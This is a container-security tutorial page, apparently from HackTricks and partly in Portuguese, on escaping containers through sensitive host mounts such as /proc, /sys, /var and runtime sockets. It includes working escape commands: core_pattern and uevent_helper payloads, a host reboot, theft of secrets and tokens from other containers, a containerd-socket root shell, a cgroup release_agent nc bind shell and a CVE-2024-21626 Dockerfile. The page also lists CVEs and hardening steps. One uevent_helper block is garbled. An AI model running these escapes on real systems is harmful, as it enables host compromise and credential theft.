# Sensitive Mounts

{{#include ../../../../banners/hacktricks-training.md}}

A exposição de `/proc`, `/sys` e `/var` sem o devido isolamento de namespace introduz riscos de segurança significativos, incluindo aumento da superfície de ataque e divulgação de informações. Esses diretórios contêm arquivos sensíveis que, se mal configurados ou acessados por um usuário não autorizado, podem levar à fuga de contêiner, modificação do host ou fornecer informações que auxiliem ataques adicionais. Por exemplo, montar incorretamente `-v /proc:/host/proc` pode contornar a proteção do AppArmor devido à sua natureza baseada em caminho, deixando `/host/proc` desprotegido.

**Você pode encontrar mais detalhes sobre cada vulnerabilidade potencial em** [**https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts**](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)**.**

## Vulnerabilidades do procfs

### `/proc/sys`

Este diretório permite o acesso para modificar variáveis do kernel, geralmente via `sysctl(2)`, e contém várias subpastas de preocupação:

#### **`/proc/sys/kernel/core_pattern`**

- Descrito em [core(5)](https://man7.org/linux/man-pages/man5/core.5.html).
- Se você puder escrever dentro deste arquivo, é possível escrever um pipe `|` seguido pelo caminho para um programa ou script que será executado após uma falha ocorrer.
- Um atacante pode encontrar o caminho dentro do host para seu contêiner executando `mount` e escrever o caminho para um binário dentro do sistema de arquivos de seu contêiner. Em seguida, causar uma falha em um programa para fazer o kernel executar o binário fora do contêiner.

- **Exemplo de Teste e Exploração**:
```bash
[ -w /proc/sys/kernel/core_pattern ] && echo Yes # Test write access
cd /proc/sys/kernel
echo "|$overlay/shell.sh" > core_pattern # Set custom handler
sleep 5 && ./crash & # Trigger handler
```
Verifique [este post](https://pwning.systems/posts/escaping-containers-for-fun/) para mais informações.

Exemplo de programa que trava:
```c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) {
buf[i] = 1;
}
return 0;
}
```
#### **`/proc/sys/kernel/modprobe`**

- Detalhado em [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
- Contém o caminho para o carregador de módulos do kernel, invocado para carregar módulos do kernel.
- **Exemplo de Verificação de Acesso**:

```bash
ls -l $(cat /proc/sys/kernel/modprobe) # Verificar acesso ao modprobe
```

#### **`/proc/sys/vm/panic_on_oom`**

- Referenciado em [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
- Uma flag global que controla se o kernel entra em pânico ou invoca o OOM killer quando uma condição de OOM ocorre.

#### **`/proc/sys/fs`**

- De acordo com [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html), contém opções e informações sobre o sistema de arquivos.
- O acesso de gravação pode permitir vários ataques de negação de serviço contra o host.

#### **`/proc/sys/fs/binfmt_misc`**

- Permite registrar interpretadores para formatos binários não nativos com base em seu número mágico.
- Pode levar a escalonamento de privilégios ou acesso a shell root se `/proc/sys/fs/binfmt_misc/register` for gravável.
- Exploit relevante e explicação:
- [Poor man's rootkit via binfmt_misc](https://github.com/toffan/binfmt_misc)
- Tutorial detalhado: [Video link](https://www.youtube.com/watch?v=WBC7hhgMvQQ)

### Outros em `/proc`

#### **`/proc/config.gz`**

- Pode revelar a configuração do kernel se `CONFIG_IKCONFIG_PROC` estiver habilitado.
- Útil para atacantes identificarem vulnerabilidades no kernel em execução.

#### **`/proc/sysrq-trigger`**

- Permite invocar comandos Sysrq, potencialmente causando reinicializações imediatas do sistema ou outras ações críticas.
- **Exemplo de Reinicialização do Host**:

```bash
echo b > /proc/sysrq-trigger # Reinicializa o host
```

#### **`/proc/kmsg`**

- Expõe mensagens do buffer de anel do kernel.
- Pode ajudar em exploits de kernel, vazamentos de endereços e fornecer informações sensíveis do sistema.

#### **`/proc/kallsyms`**

- Lista símbolos exportados do kernel e seus endereços.
- Essencial para o desenvolvimento de exploits de kernel, especialmente para superar KASLR.
- Informações de endereço são restritas com `kptr_restrict` definido como `1` ou `2`.
- Detalhes em [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).

#### **`/proc/[pid]/mem`**

- Interfaces com o dispositivo de memória do kernel `/dev/mem`.
- Historicamente vulnerável a ataques de escalonamento de privilégios.
- Mais em [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).

#### **`/proc/kcore`**

- Representa a memória física do sistema no formato ELF core.
- A leitura pode vazar conteúdos de memória do sistema host e de outros contêineres.
- O grande tamanho do arquivo pode levar a problemas de leitura ou falhas de software.
- Uso detalhado em [Dumping /proc/kcore in 2019](https://schlafwandler.github.io/posts/dumping-/proc/kcore/).

#### **`/proc/kmem`**

- Interface alternativa para `/dev/kmem`, representando a memória virtual do kernel.
- Permite leitura e gravação, portanto, modificação direta da memória do kernel.

#### **`/proc/mem`**

- Interface alternativa para `/dev/mem`, representando a memória física.
- Permite leitura e gravação, a modificação de toda a memória requer a resolução de endereços virtuais para físicos.

#### **`/proc/sched_debug`**

- Retorna informações de agendamento de processos, contornando as proteções do namespace PID.
- Expõe nomes de processos, IDs e identificadores de cgroup.

#### **`/proc/[pid]/mountinfo`**

- Fornece informações sobre pontos de montagem no namespace de montagem do processo.
- Expõe a localização do `rootfs` ou imagem do contêiner.

### Vulnerabilidades em `/sys`

#### **`/sys/kernel/uevent_helper`**

- Usado para manipular `uevents` de dispositivos do kernel.
- Gravar em `/sys/kernel/uevent_helper` pode executar scripts arbitrários ao serem acionados `uevent`.
- **Exemplo de Exploração**:
```bash

#### Creates a payload

echo "#!/bin/sh" > /evil-helper echo "ps > /output" >> /evil-helper chmod +x /evil-helper

#### Finds host path from OverlayFS mount for container

host*path=$(sed -n 's/.*\perdir=(\[^,]\_).\*/\1/p' /etc/mtab)

#### Sets uevent_helper to malicious helper

echo "$host_path/evil-helper" > /sys/kernel/uevent_helper

#### Triggers a uevent

echo change > /sys/class/mem/null/uevent

#### Reads the output

cat /output
```

#### **`/sys/class/thermal`**

- Controls temperature settings, potentially causing DoS attacks or physical damage.

#### **`/sys/kernel/vmcoreinfo`**

- Leaks kernel addresses, potentially compromising KASLR.

#### **`/sys/kernel/security`**

- Houses `securityfs` interface, allowing configuration of Linux Security Modules like AppArmor.
- Access might enable a container to disable its MAC system.

#### **`/sys/firmware/efi/vars` and `/sys/firmware/efi/efivars`**

- Exposes interfaces for interacting with EFI variables in NVRAM.
- Misconfiguration or exploitation can lead to bricked laptops or unbootable host machines.

#### **`/sys/kernel/debug`**

- `debugfs` offers a "no rules" debugging interface to the kernel.
- History of security issues due to its unrestricted nature.

### `/var` Vulnerabilities

The host's **/var** folder contains container runtime sockets and the containers' filesystems.
If this folder is mounted inside a container, that container will get read-write access to other containers' file systems
with root privileges. This can be abused to pivot between containers, to cause a denial of service, or to backdoor other
containers and applications that run in them.

#### Kubernetes

If a container like this is deployed with Kubernetes:

```yaml
apiVersion: v1  
kind: Pod  
metadata:  
  name: pod-mounts-var  
  labels:  
    app: pentest  
spec:  
  containers:  
  - name: pod-mounts-var-folder  
    image: alpine  
    volumeMounts:  
    - mountPath: /host-var  
      name: noderoot  
    command: [ "/bin/sh", "-c", "--" ]  
    args: [ "while true; do sleep 30; done;" ]  
  volumes:  
  - name: noderoot  
    hostPath:  
      path: /var
```

Inside the **pod-mounts-var-folder** container:

```bash
/ # find /host-var/ -type f -iname '*.env*' 2>/dev/null

/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/201/fs/usr/src/app/.env.example
<SNIP>
/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/135/fs/docker-entrypoint.d/15-local-resolvers.envsh

/ # cat /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/105/fs/usr/src/app/.env.example | grep -i secret
JWT_SECRET=85d<SNIP>a0
REFRESH_TOKEN_SECRET=14<SNIP>ea

/ # find /host-var/ -type f -iname 'index.html' 2>/dev/null
/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/57/fs/usr/src/app/node_modules/@mapbox/node-pre-gyp/lib/util/nw-pre-gyp/index.html
<SNIP>
/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/140/fs/usr/share/nginx/html/index.html
/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/132/fs/usr/share/nginx/html/index.html

/ # echo '<!DOCTYPE html><html lang="pt"><head><script>alert("XSS Armazenado!")</script></head></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/140/fs/usr/share/nginx/html/index2.html
```

The XSS was achieved:

![Stored XSS via mounted /var folder](/images/stored-xss-via-mounted-var-folder.png)

Note that the container DOES NOT require a restart or anything. Any changes made via the mounted **/var** folder will be applied instantly.

You can also replace configuration files, binaries, services, application files, and shell profiles to achieve automatic (or semi-automatic) RCE.

##### Access to cloud credentials

The container can read K8s serviceaccount tokens or AWS webidentity tokens
which allows the container to gain unauthorized access to K8s or cloud:

```bash
/ # find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
/host-var/lib/kubelet/pods/21411f19-934c-489e-aa2c-4906f278431e/volumes/kubernetes.io~projected/kube-api-access-64jw2/..2025_01_22_12_37_42.4197672587/token
<SNIP>
/host-var/lib/kubelet/pods/01c671a5-aaeb-4e0b-adcd-1cacd2e418ac/volumes/kubernetes.io~projected/kube-api-access-bljdj/..2025_01_22_12_17_53.265458487/token
/host-var/lib/kubelet/pods/01c671a5-aaeb-4e0b-adcd-1cacd2e418ac/volumes/kubernetes.io~projected/aws-iam-token/..2025_01_22_03_45_56.2328221474/token
/host-var/lib/kubelet/pods/5fb6bd26-a6aa-40cc-abf7-ecbf18dde1f6/volumes/kubernetes.io~projected/kube-api-access-fm2t6/..2025_01_22_12_25_25.3018586444/token
```

#### Docker

The exploitation in Docker (or in Docker Compose deployments) is exactly the same, except that usually
the other containers' filesystems are available under a different base path:

```bash
$ docker info | grep -i 'docker root\|storage driver'
Driver de Armazenamento: overlay2
Diretório Raiz do Docker: /var/lib/docker
```

So the filesystems are under `/var/lib/docker/overlay2/`:

```bash
$ sudo ls -la /var/lib/docker/overlay2

drwx--x---  4 root root  4096 Jan  9 22:14 00762bca8ea040b1bb28b61baed5704e013ab23a196f5fe4758dafb79dfafd5d  
drwx--x---  4 root root  4096 Jan 11 17:00 03cdf4db9a6cc9f187cca6e98cd877d581f16b62d073010571e752c305719496  
drwx--x---  4 root root  4096 Jan  9 21:23 049e02afb3f8dec80cb229719d9484aead269ae05afe81ee5880ccde2426ef4f  
drwx--x---  4 root root  4096 Jan  9 21:22 062f14e5adbedce75cea699828e22657c8044cd22b68ff1bb152f1a3c8a377f2  
<SNIP>
```

#### Note

The actual paths may differ in different setups, which is why your best bet is to use the **find** command to
locate the other containers' filesystems and SA / web identity tokens



### Other Sensitive Host Sockets and Directories (2023-2025)

Mounting certain host Unix sockets or writable pseudo-filesystems is equivalent to giving the container full root on the node. **Treat the following paths as highly sensitive and never expose them to untrusted workloads**:

```text
/run/containerd/containerd.sock     # soquete CRI do containerd  
/var/run/crio/crio.sock             # soquete de runtime CRI-O  
/run/podman/podman.sock             # API do Podman (com ou sem root)  
/run/buildkit/buildkitd.sock        # daemon do BuildKit (com root)  
/var/run/kubelet.sock               # API do Kubelet em nós do Kubernetes  
/run/firecracker-containerd.sock    # Kata / Firecracker
```

Attack example abusing a mounted **containerd** socket:

```bash
# dentro do contêiner (socket está montado em /host/run/containerd.sock)
ctr --address /host/run/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /host/run/containerd.sock run --tty --privileged --mount \
type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/bash   # shell root completo no host
```

A similar technique works with **crictl**, **podman** or the **kubelet** API once their respective sockets are exposed.

Writable **cgroup v1** mounts are also dangerous. If `/sys/fs/cgroup` is bind-mounted **rw** and the host kernel is vulnerable to **CVE-2022-0492**, an attacker can set a malicious `release_agent` and execute arbitrary code in the *initial* namespace:

```bash
# assumindo que o contêiner tem CAP_SYS_ADMIN e um kernel vulnerável
mkdir -p /tmp/x && echo 1 > /tmp/x/notify_on_release

echo '/tmp/pwn' > /sys/fs/cgroup/release_agent   # requer CVE-2022-0492

echo -e '#!/bin/sh\nnc -lp 4444 -e /bin/sh' > /tmp/pwn && chmod +x /tmp/pwn
sh -c "echo 0 > /tmp/x/cgroup.procs"  # aciona o evento empty-cgroup
```

When the last process leaves the cgroup, `/tmp/pwn` runs **as root on the host**. Patched kernels (>5.8 with commit `32a0db39f30d`) validate the writer’s capabilities and block this abuse.

### Mount-Related Escape CVEs (2023-2025)

* **CVE-2024-21626 – runc “Leaky Vessels” file-descriptor leak**
runc ≤ 1.1.11 leaked an open directory file descriptor that could point to the host root. A malicious image or `docker exec` could start a container whose *working directory* is already on the host filesystem, enabling arbitrary file read/write and privilege escalation. Fixed in runc 1.1.12 (Docker ≥ 25.0.3, containerd ≥ 1.7.14).

```Dockerfile
FROM scratch
WORKDIR /proc/self/fd/4   # 4 == "/" on the host leaked by the runtime
CMD ["/bin/sh"]
```

* **CVE-2024-23651 / 23653 – BuildKit OverlayFS copy-up TOCTOU**
A race condition in the BuildKit snapshotter let an attacker replace a file that was about to be *copy-up* into the container’s rootfs with a symlink to an arbitrary path on the host, gaining write access outside the build context. Fixed in BuildKit v0.12.5 / Buildx 0.12.0. Exploitation requires an untrusted `docker build` on a vulnerable daemon.

* **CVE-2024-1753 – Buildah / Podman bind-mount breakout during `build`**
Buildah ≤ 1.35.0 (and Podman ≤ 4.9.3) incorrectly resolved absolute paths passed to `--mount=type=bind` in a *Containerfile*. A crafted build stage could mount `/` from the host **read-write** inside the build container when SELinux was disabled or in permissive mode, leading to full escape at build time. Patched in Buildah 1.35.1 and the corresponding Podman 4.9.4 back-port series.

* **CVE-2024-40635 – containerd UID integer overflow**
Supplying a `User` value larger than `2147483647` in an image config overflowed the 32-bit signed integer and started the process as UID 0 inside the host user namespace. Workloads expected to run as non-root could therefore obtain root privileges. Fixed in containerd 1.6.38 / 1.7.27 / 2.0.4.

### Hardening Reminders (2025)

1. Bind-mount host paths **read-only** whenever possible and add `nosuid,nodev,noexec` mount options.
2. Prefer dedicated side-car proxies or rootless clients instead of exposing the runtime socket directly.
3. Keep the container runtime up-to-date (runc ≥ 1.1.12, BuildKit ≥ 0.12.5, Buildah ≥ 1.35.1 / Podman ≥ 4.9.4, containerd ≥ 1.7.27).
4. In Kubernetes, use `securityContext.readOnlyRootFilesystem: true`, the *restricted* PodSecurity profile and avoid `hostPath` volumes pointing to the paths listed above.

### References

- [runc CVE-2024-21626 advisory](https://github.com/opencontainers/runc/security/advisories/GHSA-xr7r-f8xq-vfvv)
- [Unit 42 analysis of CVE-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)
- [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)
- [Understanding and Hardening Linux Containers](https://research.nccgroup.com/wp-content/uploads/2020/07/ncc_group_understanding_hardening_linux_containers-1-1.pdf)
- [Abusing Privileged and Unprivileged Linux Containers](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2016/june/container_whitepaper.pdf)
- [Buildah CVE-2024-1753 advisory](https://github.com/containers/buildah/security/advisories/GHSA-pmf3-c36m-g5cf)
- [containerd CVE-2024-40635 advisory](https://github.com/containerd/containerd/security/advisories/GHSA-265r-hfxg-fhmg)

{{#include ../../../../banners/hacktricks-training.md}}
